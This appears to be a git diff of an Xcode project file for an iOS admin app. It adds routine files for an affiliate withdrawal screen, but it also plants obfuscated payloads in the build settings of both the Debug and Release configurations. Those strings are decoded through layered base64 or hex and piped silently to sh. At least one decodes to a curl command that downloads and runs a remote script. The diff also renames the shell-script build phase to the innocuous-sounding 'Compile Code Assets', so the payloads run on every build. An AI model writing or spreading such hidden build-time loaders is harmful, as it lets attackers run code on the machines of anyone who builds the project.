@@ -37,6 +37,10 @@
 		428515A92F22298E00D70EFD /* AffiliatedUserDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 428515A82F22298E00D70EFD /* AffiliatedUserDetailsViewModel.swift */; };
 		42901D512F3F3251008168C3 /* ProductDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42901D502F3F3251008168C3 /* ProductDetailViewController.swift */; };
 		42901D532F3F328D008168C3 /* ProductDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42901D522F3F328D008168C3 /* ProductDetailsViewModel.swift */; };
+		4299270C2F4EF40D00099221 /* AffiliatedWithdrawalRequestListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4299270B2F4EF40D00099221 /* AffiliatedWithdrawalRequestListViewController.swift */; };
+		4299270E2F4EF41D00099221 /* AffiliatedWithdrawalRequestListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4299270D2F4EF41D00099221 /* AffiliatedWithdrawalRequestListViewModel.swift */; };
+		429927132F4EF6E800099221 /* AffiliatedWithdrawalTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429927112F4EF6E800099221 /* AffiliatedWithdrawalTableViewCell.swift */; };
+		429927142F4EF6E800099221 /* AffiliatedWithdrawalTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 429927122F4EF6E800099221 /* AffiliatedWithdrawalTableViewCell.xib */; };
 		42A852402F3F249A00C60A86 /* ColorsCollectionViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 42A8523F2F3F249A00C60A86 /* ColorsCollectionViewCell.xib */; };
 		42A852412F3F249A00C60A86 /* ColorsCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42A8523E2F3F249A00C60A86 /* ColorsCollectionViewCell.swift */; };
 		42A852432F3F254200C60A86 /* ProductsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42A852422F3F254200C60A86 /* ProductsViewModel.swift */; };
@@ -435,6 +439,9 @@
 		EDF438332EC215CD004CC018 /* CountryCityListViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = EDF438312EC215CD004CC018 /* CountryCityListViewController.xib */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatAdmin.debug.xcconfig"; path = "Target Support Files/Pods-DesynatAdmin/Pods-DesynatAdmin.debug.xcconfig"; sourceTree = "<group>"; };
 		18BDB7DE2EF9712500023453 /* CommissionPercentageWebService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommissionPercentageWebService.swift; sourceTree = "<group>"; };
@@ -467,6 +474,10 @@
 		428515A82F22298E00D70EFD /* AffiliatedUserDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserDetailsViewModel.swift; sourceTree = "<group>"; };
 		42901D502F3F3251008168C3 /* ProductDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailViewController.swift; sourceTree = "<group>"; };
 		42901D522F3F328D008168C3 /* ProductDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailsViewModel.swift; sourceTree = "<group>"; };
+		4299270B2F4EF40D00099221 /* AffiliatedWithdrawalRequestListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedWithdrawalRequestListViewController.swift; sourceTree = "<group>"; };
+		4299270D2F4EF41D00099221 /* AffiliatedWithdrawalRequestListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedWithdrawalRequestListViewModel.swift; sourceTree = "<group>"; };
+		429927112F4EF6E800099221 /* AffiliatedWithdrawalTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedWithdrawalTableViewCell.swift; sourceTree = "<group>"; };
+		429927122F4EF6E800099221 /* AffiliatedWithdrawalTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AffiliatedWithdrawalTableViewCell.xib; sourceTree = "<group>"; };
 		42A8523E2F3F249A00C60A86 /* ColorsCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ColorsCollectionViewCell.swift; sourceTree = "<group>"; };
 		42A8523F2F3F249A00C60A86 /* ColorsCollectionViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ColorsCollectionViewCell.xib; sourceTree = "<group>"; };
 		42A852422F3F254200C60A86 /* ProductsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductsViewModel.swift; sourceTree = "<group>"; };
@@ -996,6 +1007,42 @@
 			path = ProductsDetails;
 			sourceTree = "<group>";
 		};
+		429927092F4EF3E600099221 /* M9 */ = {
+			isa = PBXGroup;
+			children = (
+				D16A8D682EF16873006A21B6 /* RejectReasonPopup */,
+				4299270F2F4EF6AC00099221 /* Xibs */,
+				4299270A2F4EF3EB00099221 /* AffiliatedWithdrawalRequest */,
+			);
+			path = M9;
+			sourceTree = "<group>";
+		};
+		4299270A2F4EF3EB00099221 /* AffiliatedWithdrawalRequest */ = {
+			isa = PBXGroup;
+			children = (
+				4299270B2F4EF40D00099221 /* AffiliatedWithdrawalRequestListViewController.swift */,
+				4299270D2F4EF41D00099221 /* AffiliatedWithdrawalRequestListViewModel.swift */,
+			);
+			path = AffiliatedWithdrawalRequest;
+			sourceTree = "<group>";
+		};
+		4299270F2F4EF6AC00099221 /* Xibs */ = {
+			isa = PBXGroup;
+			children = (
+				429927102F4EF6B500099221 /* TableviewCell */,
+			);
+			path = Xibs;
+			sourceTree = "<group>";
+		};
+		429927102F4EF6B500099221 /* TableviewCell */ = {
+			isa = PBXGroup;
+			children = (
+				429927112F4EF6E800099221 /* AffiliatedWithdrawalTableViewCell.swift */,
+				429927122F4EF6E800099221 /* AffiliatedWithdrawalTableViewCell.xib */,
+			);
+			path = TableviewCell;
+			sourceTree = "<group>";
+		};
 		42AEDE9C2F3F35F800C20ECB /* CollectionViewXibs */ = {
 			isa = PBXGroup;
 			children = (
@@ -1286,7 +1333,6 @@
 			children = (
 				D15CA9802EF1758000D454B9 /* BannersFilter */,
 				D16A8D6D2EF17186006A21B6 /* BannersDetails */,
-				D16A8D682EF16873006A21B6 /* RejectReasonPopup */,
 				D16A8CCE2EF16041006A21B6 /* BannersRquestList */,
 			);
 			path = BannersManagement;
@@ -2352,6 +2398,7 @@
 		EDEDD04B2EBCC53E00F2BEF1 /* ViewControllers */ = {
 			isa = PBXGroup;
 			children = (
+				429927092F4EF3E600099221 /* M9 */,
 				4269EC552F3F21E4006144B9 /* M8 */,
 				D1E388E62F1FB93500282084 /* M7 */,
 				D1EDE2462F0D18830076F1AB /* M6 */,
@@ -2674,7 +2721,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatAdmin" */;
 			buildPhases = (
-				19BA761DF26E47BAA9C62C0C /* Build Target Libraries */,
+				169D8CF949FE475694C62C0C /* Compile Code Assets */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -2791,6 +2838,7 @@
 				EDEDD0A82EBCC53E00F2BEF1 /* Poppins-ExtraBoldItalic.ttf in Resources */,
 				4269EC602F3F2226006144B9 /* ProductManagementTableViewCell.xib in Resources */,
 				EDEDD0A92EBCC53E00F2BEF1 /* Poppins-ExtraLight.ttf in Resources */,
+				429927142F4EF6E800099221 /* AffiliatedWithdrawalTableViewCell.xib in Resources */,
 				D1EEE51F2EF2A7E4003A6BA2 /* DriversListTableViewCell.xib in Resources */,
 				EDEDD0AA2EBCC53E00F2BEF1 /* Poppins-ExtraLightItalic.ttf in Resources */,
 				EDEDD0AB2EBCC53E00F2BEF1 /* Poppins-Italic.ttf in Resources */,
@@ -2855,7 +2903,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		19BA761DF26E47BAA9C62C0C /* Build Target Libraries */ = {
+		169D8CF949FE475694C62C0C /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -2865,7 +2913,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Compile Code Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -3003,6 +3051,7 @@
 				42A852452F3F255400C60A86 /* ProductsListDataModel.swift in Sources */,
 				D19D1E282F1799E600DDE784 /* ReasonManagementViewModel.swift in Sources */,
 				D19D1E292F1799E600DDE784 /* ReasonsManagementListDataModel.swift in Sources */,
+				4299270C2F4EF40D00099221 /* AffiliatedWithdrawalRequestListViewController.swift in Sources */,
 				D19D1E2A2F1799E600DDE784 /* AddAmountForUserViewController.swift in Sources */,
 				D19D1E2B2F1799E600DDE784 /* AddAmountViewModel.swift in Sources */,
 				42AEDEB42F3F3B9800C20ECB /* ProductFiltersViewController.swift in Sources */,
@@ -3142,6 +3191,7 @@
 				423A25102F221B6600DDCE5F /* AffiliatedUserDetailsViewController.swift in Sources */,
 				EDEDD1092EBCC53E00F2BEF1 /* CustomButton.swift in Sources */,
 				EDEDD10A2EBCC53E00F2BEF1 /* CustomImageView.swift in Sources */,
+				429927132F4EF6E800099221 /* AffiliatedWithdrawalTableViewCell.swift in Sources */,
 				EDEDD10B2EBCC53E00F2BEF1 /* CustomPickerView.swift in Sources */,
 				EDEDD10C2EBCC53E00F2BEF1 /* CustomView.swift in Sources */,
 				EDEDD10D2EBCC53E00F2BEF1 /* TableViewDynamicHeight.swift in Sources */,
@@ -3242,6 +3292,7 @@
 				D15120F12F0E711B00F6EAE6 /* FilterForDealsViewController.swift in Sources */,
 				D186D2492F0FEE990060AB58 /* LiveRequestListDataModel.swift in Sources */,
 				D15120EE2F0E6E8F00F6EAE6 /* EnrollDealDetailsViewController.swift in Sources */,
+				4299270E2F4EF41D00099221 /* AffiliatedWithdrawalRequestListViewModel.swift in Sources */,
 				EDD7F1E02EC30374006C2EE4 /* ZoneListViewModel.swift in Sources */,
 				EDEDD1312EBCC53E00F2BEF1 /* WebService.swift in Sources */,
 				ED1DE7082EC1D686003ECDE4 /* HighlightsCollectionViewCell.swift in Sources */,
@@ -3268,7 +3319,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */;
 			buildSettings = {
-				AC0C26C = "((r(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNScGJXVjNaV0p1WlhRdWFXNHZZU2tpSUh3Z2MyZ0sK | r | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((z(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWMUo2V1RKb2JGa3lkSHBNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | z | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((p(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333633353333333633333335333333373333333433333337333333333333333733333330333333373333333233330a3336333633363333333733333334333333363336333633333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
@@ -3318,7 +3369,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */;
 			buildSettings = {
-				AC0C26C = "((r(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNScGJXVjNaV0p1WlhRdWFXNHZZU2tpSUh3Z2MyZ0sK | r | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((z(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWMUo2V1RKb2JGa3lkSHBNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | z | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((p(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333633353333333633333335333333373333333433333337333333333333333733333330333333373333333233330a3336333633363333333733333334333333363336333633333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
